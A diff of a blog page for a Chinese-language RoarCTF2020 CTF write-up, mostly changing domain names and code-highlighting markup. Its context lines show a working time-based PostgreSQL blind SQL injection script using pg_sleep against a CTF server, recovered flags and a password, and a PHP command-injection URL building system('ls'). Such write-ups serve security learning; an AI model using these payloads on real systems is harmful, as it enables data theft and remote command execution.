@@ -8,17 +8,17 @@
         <title>RoarCTF2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="RoarCTF2020 Writeup" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/roarctf2020-writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/roarctf2020-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-12-08T15:35:03+08:00" />
 <meta property="article:modified_time" content="2020-12-08T15:35:03+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="RoarCTF2020 Writeup"/>
 <meta name="twitter:description" content=""/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/roarctf2020-writeup/" /><link rel="prev" href="https://clq0.top/htb-traceback-writeup/" /><link rel="next" href="https://clq0.top/bypass-disable_function-php/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/roarctf2020-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/htb-traceback-writeup/" /><link rel="next" href="https://blog.h4ck.fun/bypass-disable_function-php/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/roarctf2020-writeup\/"
+            "@id": "https:\/\/blog.h4ck.fun\/roarctf2020-writeup\/"
         },"genre": "posts","keywords": "SQL注入, RCE","wordcount":  622 ,
-        "url": "https:\/\/clq0.top\/roarctf2020-writeup\/","datePublished": "2020-12-08T15:35:03+08:00","dateModified": "2020-12-08T15:35:03+08:00","publisher": {
+        "url": "https:\/\/blog.h4ck.fun\/roarctf2020-writeup\/","datePublished": "2020-12-08T15:35:03+08:00","dateModified": "2020-12-08T15:35:03+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -124,18 +124,18 @@
 <p>PostgreSQL盲注</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">SELECT * FROM users WHERE username=&#39;${username}&#39; AND password=&#39;${password}&#39;
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">SELECT * FROM users WHERE username=&#39;${username}&#39; AND password=&#39;${password}&#39;
 //flag{eb4aaa7f-1362-4f4c-9f5f-a7202518314b}
 </code></pre></td></tr></table>
 </div>
 </div><p>exp:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -161,12 +161,12 @@
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="k">def</span> <span class="nf">timeInjection</span><span class="p">():</span>
     <span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://139.129.98.9:30005/&#34;</span>
     <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1&#39;||(case/**/when/**/(coalesce(ascii(substr((select/**/password),{},1)),0)={})/**/then/**/pg_sleep(2)/**/else/**/pg_sleep(0)/**/end)--&#34;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1&#39;||(case/**/when/**/(coalesce(ascii(substr((select/**/password),</span><span class="si">{}</span><span class="s2">,1)),0)=</span><span class="si">{}</span><span class="s2">)/**/then/**/pg_sleep(2)/**/else/**/pg_sleep(0)/**/end)--&#34;</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
         <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
             <span class="n">tmp_payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
@@ -178,13 +178,13 @@
             <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
             <span class="k">if</span>  <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
                 <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">)</span>
                 <span class="k">break</span>
             <span class="k">else</span><span class="p">:</span>
                 <span class="k">pass</span>
 <span class="n">timeInjection</span><span class="p">()</span>
-<span class="c1">#密码：Pg5QL1sF4ns1N4T1n9</span>
+<span class="c1">#密码：Pg5QL1sF4ns1N4T1n9</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -199,10 +199,10 @@
 <p>PostgreSQL盲注</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-plain" data-lang="plain">flag{5f2561bb-685e-4b36-927b-89ec76fec285}
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain">flag{5f2561bb-685e-4b36-927b-89ec76fec285}
 </code></pre></td></tr></table>
 </div>
 </div><p>exp:上面的exp端口改成30007即可</p>
@@ -223,11 +223,11 @@
 <p>但大于41后的数组内容可控，且本地尝试过程中，发现由于它算法原因，产生了个小trick</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">var_dump($input);//结果如下
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span><span class="c1">//结果如下
+</span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -241,7 +241,7 @@
 <p>然后一个个传入ascii构造即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -254,7 +254,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-http" data-lang="http"><span class="err">system(&#39;ls&#39;)/*
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">system(&#39;ls&#39;)/*
 </span><span class="err">http://47.104.191.60:38199/bond007.php?cmd[52]=115&amp;cmd[53]=121&amp;cmd[54]=115&amp;cmd[55]=116&amp;cmd[56]=101&amp;cmd[57]=109&amp;cmd[58]=40&amp;cmd[59]=39&amp;cmd[60]=108&amp;cmd[61]=115&amp;cmd[62]=39&amp;cmd[63]=41&amp;cmd[64]=59&amp;cmd[65]=47&amp;cmd[66]=42&amp;cmd[15]=100&amp;cmd[16]=100&amp;cmd[17]=100&amp;cmd[18]=100&amp;cmd[19]=100&amp;cmd[20]=100&amp;cmd[21]=100&amp;cmd[22]=100&amp;cmd[23]=100&amp;cmd[24]=100&amp;cmd[25]=100&amp;cmd[26]=100&amp;cmd[27]=100&amp;cmd[28]=100&amp;cmd[29]=100&amp;cmd[30]=100&amp;cmd[31]=100&amp;cmd[32]=100&amp;cmd[33]=100&amp;cmd[34]=100&amp;cmd[35]=100&amp;cmd[36]=100&amp;cmd[37]=100&amp;cmd[38]=100&amp;cmd[39]=100&amp;cmd[40]=100&amp;cmd[41]=100
 </span><span class="err">//bond007.php index.php
 </span><span class="err">
@@ -285,7 +285,7 @@
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/roarctf2020-writeup/" data-title="RoarCTF2020 Writeup" data-hashtags="SQL注入,RCE"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/roarctf2020-writeup/" data-hashtag="SQL注入"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/roarctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/roarctf2020-writeup/" data-title="RoarCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/roarctf2020-writeup/" data-title="RoarCTF2020 Writeup" data-via="Le0nsec" data-hashtags="SQL注入,RCE"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/roarctf2020-writeup/" data-hashtag="SQL注入"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/roarctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/roarctf2020-writeup/" data-title="RoarCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -304,7 +304,7 @@
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
